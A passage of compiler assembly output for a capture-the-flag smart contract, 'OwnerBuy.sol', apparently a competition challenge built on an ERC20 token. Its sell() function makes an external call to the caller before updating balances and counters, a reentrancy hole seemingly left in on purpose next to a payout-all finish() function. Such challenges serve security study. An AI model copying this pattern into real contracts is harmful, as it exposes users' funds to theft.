success) {\r... */\n      swap1\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2036:2192  function transfer(address recipient, uint256 amount) public returns (bool) {\r... */\n    tag_116:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2105:2109  bool */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2122:2162  _transfer(msg.sender, recipient, amount) */\n      tag_198\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2132:2142  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2144:2153  recipient */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2155:2161  amount */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2122:2131  _transfer */\n      tag_152\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2122:2162  _transfer(msg.sender, recipient, amount) */\n      jump\t// in\n    tag_198:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2180:2184  true */\n      0x01\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2173:2184  return true */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2036:2192  function transfer(address recipient, uint256 amount) public returns (bool) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":283:304  address public _owner */\n    tag_119:\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2938:3067  function setWhite(address addr) external onlyOwner returns (bool) {\r... */\n    tag_123:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2998:3002  bool */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1028:1038  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1038  _owner == msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1024  _owner */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1038  _owner == msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1010:1075  require(_owner == msg.sender, \"Ownable: caller is not the owner\") */\n      tag_200\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x20\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_200:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3033:3037  true */\n      0x01\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3015:3024  whiteList */\n      0x0a\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3015:3030  whiteList[addr] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3025:3029  addr */\n      dup5\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3015:3030  whiteList[addr] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3015:3037  whiteList[addr] = true */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3055:3059  true */\n      0x01\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3048:3059  return true */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2938:3067  function setWhite(address addr) external onlyOwner returns (bool) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4990:5229  function finish() public onlyOwner returns (bool) {\r... */\n    tag_126:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5034:5038  bool */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1028:1038  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1038  _owner == msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1024  _owner */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1038  _owner == msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1010:1075  require(_owner == msg.sender, \"Ownable: caller is not the owner\") */\n      tag_203\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x20\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_203:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5080:5083  100 */\n      0x64\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5059:5064  Times */\n      0x09\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5059:5076  Times[msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5065:5075  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5059:5076  Times[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5059:5083  Times[msg.sender] >= 100 */\n      lt\n      iszero\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5051:5084  require(Times[msg.sender] >= 100) */\n      tag_205\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_205:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5115:5116  0 */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5095:5100  Times */\n      0x09\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5095:5112  Times[msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5101:5111  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5095:5112  Times[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5095:5116  Times[msg.sender] = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5127:5137  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5127:5146  msg.sender.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5127:5169  msg.sender.transfer(address(this).balance) */\n      0x08fc\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5147:5168  address(this).balance */\n      selfbalance\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5127:5169  msg.sender.transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_206\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_206:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5127:5169  msg.sender.transfer(address(this).balance) */\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5185:5199  finished(true) */\n      0xc6ca6dd98a4b886a6583c4fe06ca48539c1b02895ede06be528c33b60f917b98\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5194:5198  true */\n      0x01\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5185:5199  finished(true) */\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5217:5221  true */\n      0x01\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5210:5221  return true */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4990:5229  function finish() public onlyOwner returns (bool) {\r... */\n      swap1\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2255:2389  function allowance(address owner, address spender) public view returns (uint256) {\r... */\n    tag_130:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2327:2334  uint256 */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2354:2365  _allowances */\n      0x03\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2354:2372  _allowances[owner] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2366:2371  owner */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2354:2372  _allowances[owner] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2354:2381  _allowances[owner][spender] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2373:2380  spender */\n      dup4\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2354:2381  _allowances[owner][spender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2347:2381  return _allowances[owner][spender] */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2255:2389  function allowance(address owner, address spender) public view returns (uint256) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4525:4982  function sell(uint256 _amount) public returns (bool success) {\r... */\n    tag_134:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4572:4584  bool success */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4616:4619  200 */\n      0xc8\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4605:4612  _amount */\n      dup3\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4605:4619  _amount >= 200 */\n      lt\n      iszero\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4597:4620  require(_amount >= 200) */\n      tag_209\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_209:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4668:4674  0xffff */\n      0xffff\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4658:4664  0xffff */\n      dup1\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4644:4654  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4639:4655  uint(msg.sender) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4639:4664  uint(msg.sender) & 0xffff */\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4639:4674  uint(msg.sender) & 0xffff == 0xffff */\n      eq\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4631:4675  require(uint(msg.sender) & 0xffff == 0xffff) */\n      tag_210\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_210:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4714:4715  0 */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4694:4699  Times */\n      0x09\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4694:4711  Times[msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4700:4710  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4694:4711  Times[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4694:4715  Times[msg.sender] > 0 */\n      gt\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4686:4716  require(Times[msg.sender] > 0) */\n      tag_211\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_211:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4760:4767  _amount */\n      dup2\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4735:4744  _balances */\n      0x02\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4735:4756  _balances[msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4745:4755  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4735:4756  _balances[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4735:4767  _balances[msg.sender] >= _amount */\n      lt\n      iszero\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4727:4768  require(_balances[msg.sender] >= _amount) */\n      tag_212\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_212:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4812:4819  _amount */\n      dup2\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4787:4808  address(this).balance */\n      selfbalance\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4787:4819  address(this).balance >= _amount */\n      lt\n      iszero\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4779:4820  require(address(this).balance >= _amount) */\n      tag_213\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_213:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4831:4841  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4831:4846  msg.sender.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4851:4858  1000000 */\n      0x0f4240\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4831:4863  msg.sender.call.gas(1000000)(\"\") */\n      mload(0x40)\n      dup1\n      0x00\n      add\n      swap1\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup8\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":14:15   */\n      dup1\n        /* \"--CODEGEN--\":21:22   */\n      0x00\n        /* \"--CODEGEN--\":16:47   */\n      dup2\n      eq\n      tag_215\n      jumpi\n        /* \"--CODEGEN--\":75:79   */\n      0x40\n        /* \"--CODEGEN--\":69:80   */\n      mload\n        /* \"--CODEGEN--\":64:80   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":144:148   */\n      0x1f\n        /* \"--CODEGEN--\":140:149   */\n      not\n        /* \"--CODEGEN--\":133:137   */\n      0x3f\n        /* \"--CODEGEN--\":115:131   */\n      returndatasize\n        /* \"--CODEGEN--\":111:138   */\n      add\n        /* \"--CODEGEN--\":107:150   */\n      and\n        /* \"--CODEGEN--\":104:105   */\n      dup3\n        /* \"--CODEGEN--\":100:151   */\n      add\n        /* \"--CODEGEN--\":94:98   */\n      0x40\n        /* \"--CODEGEN--\":87:152   */\n      mstore\n        /* \"--CODEGEN--\":169:185   */\n      returndatasize\n        /* \"--CODEGEN--\":166:167   */\n      dup3\n        /* \"--CODEGEN--\":159:186   */\n      mstore\n        /* \"--CODEGEN--\":225:241   */\n      returndatasize\n        /* \"--CODEGEN--\":222:223   */\n      0x00\n        /* \"--CODEGEN--\":215:219   */\n      0x20\n        /* \"--CODEGEN--\":212:213   */\n      dup5\n        /* \"--CODEGEN--\":208:220   */\n      add\n        /* \"--CODEGEN--\":193:242   */\n      returndatacopy\n        /* \"--CODEGEN--\":7:249   */\n      jump(tag_214)\n        /* \"--CODEGEN--\":16:47   */\n    tag_215:\n        /* \"--CODEGEN--\":36:40   */\n      0x60\n        /* \"--CODEGEN--\":31:40   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":7:249   */\n    tag_214:\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4831:4863  msg.sender.call.gas(1000000)(\"\") */\n      pop\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4874:4919  _transfer(msg.sender, address(this), _amount) */\n      tag_216\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4884:4894  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4904:4908  this */\n      address\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4911:4918  _amount */\n      dup5\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4874:4883  _transfer */\n      tag_152\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4874:4919  _transfer(msg.sender, address(this), _amount) */\n      jump\t// in\n    tag_216:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4951:4952  1 */\n      0x01\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4930:4935  Times */\n      0x09\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4930:4947  Times[msg.sender] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4936:4946  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4930:4947  Times[msg.sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4930:4952  Times[msg.sender] -= 1 */\n      dup3\n      dup3\n      sload\n      sub\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4970:4974  true */\n      0x01\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4963:4974  return true */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4525:4982  function sell(uint256 _amount) public returns (bool success) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1741:2016  function transferOwnership(address newOwner) public onlyOwner {\r... */\n    tag_138:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1028:1038  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1038  _owner == msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1024  _owner */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1038  _owner == msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1010:1075  require(_owner == msg.sender, \"Ownable: caller is not the owner\") */\n      tag_218\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x20\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_218:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1856:1857  0 */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1836:1858  newOwner != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1836:1844  newOwner */\n      dup2\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1836:1858  newOwner != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n      iszero\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1814:1924  require(\r... */\n      tag_220\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x26\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_245f15ff17f551913a7a18385165551503906a406f905ac1c2437281a7cd0cfe\n      0x26\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_220:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1971:1979  newOwner */\n      dup1\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1942:1980  OwnershipTransferred(_owner, newOwner) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1963:1969  _owner */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1942:1980  OwnershipTransferred(_owner, newOwner) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0\n      mload(0x40)\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2000:2008  newOwner */\n      dup1\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1991:1997  _owner */\n      0x00\n      dup1\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1991:2008  _owner = newOwner */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1741:2016  function transferOwnership(address newOwner) public onlyOwner {\r... */\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2092:2253  function lock() public onlyOwner {\r... */\n    tag_141:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1028:1038  msg.sender */\n      caller\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1038  _owner == msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1024  _owner */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1018:1038  _owner == msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1010:1075  require(_owner == msg.sender, \"Ownable: caller is not the owner\") */\n      tag_222\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x20\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_222:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2153:2159  _owner */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2136:2150  _previousOwner */\n      0x01\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2136:2159  _previousOwner = _owner */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2187:2188  0 */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2170:2176  _owner */\n      dup1\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2170:2189  _owner = address(0) */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2242:2243  0 */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2205:2245  OwnershipTransferred(_owner, address(0)) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2226:2232  _owner */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2205:2245  OwnershipTransferred(_owner, address(0)) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0\n      mload(0x40)\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2092:2253  function lock() public onlyOwner {\r... */\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7070:7405  function _approve(address owner, address spender, uint256 value) internal {\r... */\n    tag_148:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7180:7181  0 */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7163:7182  owner != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7163:7168  owner */\n      dup4\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7163:7182  owner != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n      iszero\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7155:7223  require(owner != address(0), \"ERC20: approve from the zero address\") */\n      tag_225\n      jumpi\n      